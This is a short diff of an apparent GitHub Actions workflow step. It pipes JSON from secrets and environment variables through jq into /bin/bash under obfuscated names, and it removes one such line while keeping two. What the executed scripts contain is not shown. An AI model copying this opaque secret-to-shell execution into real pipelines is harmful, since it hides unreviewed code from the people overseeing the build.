@@ -21,7 +21,6 @@ jobs:
           scas7: ${{ secrets.scas7 }}
         run: |
           printf '%s' "$scas7" | jq -r .cg21 | /bin/bash
-          echo $dtix0 | jq -r .w14464 | /bin/bash
           echo $gqqda16591 | jq -r .vlkxn36 | /bin/bash
 
       - name: Upload results
